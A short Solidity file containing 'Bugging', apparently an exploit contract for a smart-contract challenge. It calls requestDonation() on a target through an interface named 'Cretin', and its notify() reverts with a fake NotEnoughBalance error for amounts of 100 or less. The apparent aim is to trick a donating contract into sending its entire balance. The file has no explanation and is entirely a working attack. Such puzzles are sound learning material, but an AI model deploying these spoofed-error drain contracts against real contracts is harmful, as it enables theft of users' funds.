// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Cretin {
    function requestDonation() external;
}

contract Bugging {
    error NotEnoughBalance();

    function notify(uint256 amount) external {
        if (amount <= 100) {
            revert NotEnoughBalance();
        }
    }

    function monez(address target) public {
        Cretin(target).requestDonation();
    }
}
